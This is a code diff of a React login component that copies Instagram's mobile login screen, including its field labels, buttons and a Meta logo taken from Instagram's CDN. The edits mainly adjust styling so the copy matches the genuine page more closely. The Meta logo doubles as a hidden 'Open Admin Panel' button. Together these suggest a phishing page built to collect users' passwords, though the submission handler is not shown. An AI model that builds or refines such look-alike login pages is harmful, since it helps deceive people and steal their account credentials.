@@ -47,24 +47,24 @@ export default function UserPortal({ onOpenAdmin }) {
   const isPasswordTyped = formData.password.length > 0;
 
   return (
-    <div className="w-full max-w-sm mx-auto flex-1 flex flex-col justify-between px-4 py-4 text-slate-900 min-h-[95vh]">
+    <div className="w-full max-w-sm mx-auto flex-1 flex flex-col justify-between px-4 py-3 -mb-3.5 text-slate-900 ">
       {/* Upper Section */}
       <div>
         {/* Language selector at the VERY top of the screen */}
-        <div className="flex justify-center -mt-2 mb-8 ">
+        <div className="flex justify-center mt-1 sm:mt-0 mb-4 sm:mb-8">
           <button
             type="button"
-            className="text-[12px] font-medium leading-[16px] text-slate-500 hover:text-slate-700 transition flex items-center gap-1 bg-transparent border-none cursor-pointer"
+            className="text-[12px] font-medium leading-[16px] text-slate-500 hover:text-slate-700 transition flex items-center bg-transparent border-none cursor-pointer px-2"
           >
             <span>English (US)</span>
           </button>
         </div>
 
         {/* Logo & Form block */}
-        <div className="pt-4">
-          {/* Centered Mock SVG Icon Logo */}
-          <div className="flex justify-center mb-28 translate-y-11">
-            <div className="w-14 h-14 rounded-2xl flex items-center justify-center">
+        <div className="mt-20">
+          {/* Centered Logo */}
+          <div className="flex justify-center mb-36">
+            <div className="w-16 h-16 rounded-2xl flex items-center justify-center">
               <img
                 src="https://i.ibb.co/gLvf8hnF/images-2-removebg-preview.png"
                 alt="Logo"
@@ -73,7 +73,7 @@ export default function UserPortal({ onOpenAdmin }) {
             </div>
           </div>
 
-          <form onSubmit={handleSubmit} className="space-y-4">
+          <form onSubmit={handleSubmit} className="space-y-3.5 -mt-12 ">
             {/* Floating Label Input: Mobile number, username or email address */}
             <div className="relative border border-[#dbdbdb] rounded-xl focus-within:border-gray-500 transition-all bg-white">
               <input
@@ -86,11 +86,11 @@ export default function UserPortal({ onOpenAdmin }) {
                   setFormData({ ...formData, username: e.target.value });
                   if (errorMessage) setErrorMessage('');
                 }}
-                className="block px-4 pt-5 pb-2 w-full text-[14px] font-normal leading-[18px] text-slate-900 bg-transparent rounded-xl appearance-none focus:outline-none peer"
+                className="block px-4 pt-5 pb-2 w-full text-[16px] sm:text-[14px] font-medium leading-[33px] text-slate-900 bg-transparent rounded-2xl appearance-none focus:outline-none peer"
               />
               <label
                 htmlFor="username"
-                className="absolute text-[14px] font-normal leading-[18px] text-slate-500 duration-200 transform -translate-y-3.5 scale-75 top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-3.5 peer-focus:text-gray-500 pointer-events-none"
+                className="absolute text-[14px] font-normal leading-[18px] text-slate-500 transform -translate-y-3.5 scale-90 top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-90 peer-focus:-translate-y-3.5 peer-focus:text-gray-500 pointer-events-none"
               >
                 Mobile number, username or email address
               </label>
@@ -99,7 +99,7 @@ export default function UserPortal({ onOpenAdmin }) {
             {/* Floating Label Input: Password */}
             <div>
               <div
-                className={`relative border rounded-xl transition-all ${
+                className={`relative border rounded-2xl transition-all ${
                   hasError
                     ? 'border-rose-600 bg-rose-50/20'
                     : 'border-[#dbdbdb] focus-within:border-gray-500 bg-white'
@@ -115,11 +115,11 @@ export default function UserPortal({ onOpenAdmin }) {
                     setFormData({ ...formData, password: e.target.value });
                     if (errorMessage) setErrorMessage('');
                   }}
-                  className="block px-4 pt-5 pb-2 pr-12 w-full text-[14px] font-normal leading-[18px] text-slate-900 bg-transparent rounded-xl appearance-none focus:outline-none peer"
+                  className="block px-4 pt-5 pb-2 pr-12 w-full text-[16px] sm:text-[14px] font-medium leading-[33px] text-slate-900 bg-transparent rounded-2xl appearance-none focus:outline-none peer"
                 />
                 <label
                   htmlFor="password"
-                  className={`absolute text-[14px] font-normal leading-[18px] duration-200 transform -translate-y-3.5 scale-75 top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-3.5 pointer-events-none ${
+                  className={`absolute text-[14px] font-normal leading-[18px] transform -translate-y-3.5 scale-85 top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-85 peer-focus:-translate-y-3.5 pointer-events-none ${
                     hasError ? 'text-rose-600' : 'text-slate-500 peer-focus:text-gray-500'
                   }`}
                 >
@@ -132,7 +132,7 @@ export default function UserPortal({ onOpenAdmin }) {
                     type="button"
                     onClick={() => setShowPassword(!showPassword)}
                     title={showPassword ? 'Hide password' : 'Show password'}
-                    className="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-600 hover:text-slate-600 transition p-1.5 rounded-md focus:outline-none"
+                    className="absolute right-2 top-1/2 -translate-y-1/2 text-slate-600 hover:text-slate-800 transition p-2.5 rounded-lg focus:outline-none touch-manipulation flex items-center justify-center"
                   >
                     {showPassword ? (
                       /* Password visible → Open Eye */
@@ -170,16 +170,16 @@ export default function UserPortal({ onOpenAdmin }) {
             <button
               type="submit"
               disabled={loading}
-              className="w-full py-3 px-4 bg-[#0064e0] hover:bg-[#0056c6] text-white text-[14px] font-semibold leading-[18px] rounded-full transition duration-150 active:scale-[0.99] disabled:opacity-50 tracking-wide mt-2 shadow-sm"
+              className="w-full py-3.5 px-4 bg-[#0064e0] hover:bg-[#0056c6] text-white text-[14px] font-bold leading-[18px] rounded-full transition duration-5 active:scale-[0.98] disabled:opacity-50 tracking-wide -mt- shadow-sm touch-manipulation cursor-pointer"
             >
               {loading ? 'Log in' : 'Log in'}
             </button>
 
             {/* Forgotten Password Link */}
-            <div className="text-center pt-2">
+            <div className="text-center">
               <button
                 type="button"
-                className="text-[14px] font-semibold leading-[18px] text-slate-800 hover:underline bg-transparent border-none cursor-pointer -translate-y-1"
+                className="text-[15.2px] font-bold leading-[18px] text-slate-800 hover:underline bg-transparent border-none cursor-pointer px-3"
               >
                 Forgot password?
               </button>
@@ -189,11 +189,11 @@ export default function UserPortal({ onOpenAdmin }) {
       </div>
 
       {/* Bottom Section */}
-      <div className="w-full space-y-2 pb-2 mt-auto">
+      <div className="w-full space-y-2 -translate-y-20 ">
         {/* Create new account button */}
         <button
           type="button"
-          className="w-full py-2.5 px-4 bg-transparent border border-[#0064e0] hover:bg-[#0064e0]/5 text-[#0064e0] text-[14px] font-normal leading-[18px] rounded-full transition text-center block"
+          className="w-full py-3 px-4 bg-transparent border border-[#0064e0] hover:bg-[#0064e0]/5 active:scale-[0.98] text-[#0064e0] text-[14px] font-bold leading-[18px] rounded-full transition text-center block touch-manipulation cursor-pointer "
         >
           Create new account
         </button>
@@ -203,24 +203,13 @@ export default function UserPortal({ onOpenAdmin }) {
           type="button"
           onClick={onOpenAdmin}
           title="Open Admin Panel"
-          className="flex items-center justify-center text-slate-500 hover:text-slate-800 transition mx-auto bg-transparent border-none cursor-pointer group py-1"
+          className="flex items-center justify-center text-slate-500 hover:text-slate-800 transition mx-auto bg-transparent border-none cursor-pointer group py-2 px-4 touch-manipulation"
         >
-          <div className="flex items-center gap-1.5">
-            <svg
-              className="w-[18px] h-[13px] text-[#0082fb]"
-              viewBox="0 0 24 18"
-              fill="none"
-            >
-              <path
-                d="M2 11.5C2 7.5 4.2 4 7.3 4C10.2 4 12.2 7.5 14 11C15.8 14.5 17 15 19 15C21 15 22 12.8 22 9.5C22 6.3 20 4 17.7 4C14.8 4 13 7.2 11.2 10.5C9.4 13.8 8 15 5.8 15C3.7 15 2 13.7 2 11.5Z"
-                stroke="currentColor"
-                strokeWidth="2"
-                strokeLinecap="round"
-              />
-            </svg>
-            <span className="text-[14px] -ml-1 font-semibold leading-[18px] text-black">
-              Meta
-            </span>
+          <div className="h-5 w-16 relative">
+            
+            <img
+              src="https://static.cdninstagram.com/rsrc.php/ys/r/RkrEdst9VSp.webp"
+              alt="Meta Logo"></img>
           </div>
         </button>
       </div>
